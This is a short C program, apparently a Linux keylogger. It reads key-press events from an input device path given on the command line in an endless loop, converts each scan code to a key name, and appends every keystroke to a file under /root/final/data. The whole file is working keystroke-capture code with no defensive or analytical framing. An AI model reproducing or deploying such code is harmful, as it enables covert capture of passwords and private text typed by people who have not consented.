#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

#include "keycode.h"									// mapping of scan codes

int main(int argc, char **argv) {
	int fd;
	int temp;
	FILE *fd2;
	if (argc < 2) {									//if driver file is not specified
		printf("You  entered %s Plese enter device path \n", argv[0]);
		return 1;
	}
	fd = open(argv[1], O_RDONLY);
	struct input_event ev;

	int flag = 0;
	
	while (1) {									//loop that checks continously for input from driver

		read(fd, &ev, sizeof(struct input_event));				//read from driver 

		if (ev.type == 1) {							//if input type is keyboard state chage event
			if (ev.value == 1) {						//if key is pressed

				temp = ev.code;						
				//printf(" got it \n " );
				flag = 1;						//setting flag for storing data in file
			}

		}
		
		if (flag == 1) {

			close(fd);							//close file of driver 

			fd2 = fopen("/root/final/data/data.txt", "a+");	//open data.txt in appendable mode

			fprintf(fd2, "%s ", (getcha(temp)));				//write key stokes in file
			fclose(fd2);							//close data.txt file	

			fd = open(argv[1], O_RDONLY);					//open device driver file again for listening to input again 

			flag = 0;							// clear flag to take input
		}
	}

}
